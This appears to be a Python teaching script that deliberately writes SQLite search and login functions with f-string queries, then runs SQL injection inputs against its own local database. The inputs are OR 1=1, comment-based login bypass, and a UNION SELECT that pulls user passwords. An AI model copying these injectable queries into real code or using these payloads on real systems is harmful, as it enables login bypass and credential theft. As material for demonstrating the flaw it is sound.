import sqlite3

# I connect to my database
conn = sqlite3.connect('nyondo_stock.db')


# This function searches for a product (BUT it is NOT safe)
def search_product(name):
    
    # I directly insert the user's input into the SQL query using an f-string
    # This is dangerous because it allows SQL injection
    query = f"SELECT * FROM products WHERE name LIKE '%{name}%'"
    
    # I print the query so I can see exactly what is being executed
    print("Query:", query)
    
    # I execute the query and fetch all results
    rows = conn.execute(query).fetchall()
    
    # I print the results
    print("Result:", rows, "\n")
    
    return rows


# This function handles login (also NOT safe)
def login(username, password):
    
    # I directly insert username and password into the query
    # This makes it easy for attackers to bypass login using SQL injection
    query = f"SELECT * FROM users WHERE username='{username}' AND password='{password}'"
    
    # I print the query to observe how it changes with input
    print("Query:", query)
    
    # I execute the query and fetch one matching user
    row = conn.execute(query).fetchone()
    
    # I print the result
    print("Result:", row, "\n")
    
    return row


# TESTING SQL INJECTION ATTACKS

# This input tricks the query into returning all products
# because ' OR 1=1 is always true
search_product("' OR 1=1--")


# This bypasses login by commenting out the password check
login("admin'--", "anything")


# This logs in without valid credentials because the condition is always true
login("' OR '1'='1", "' OR '1'='1")


# This tries to extract data from another table (users) using UNION
search_product("' UNION SELECT id, username, password, role FROM users--")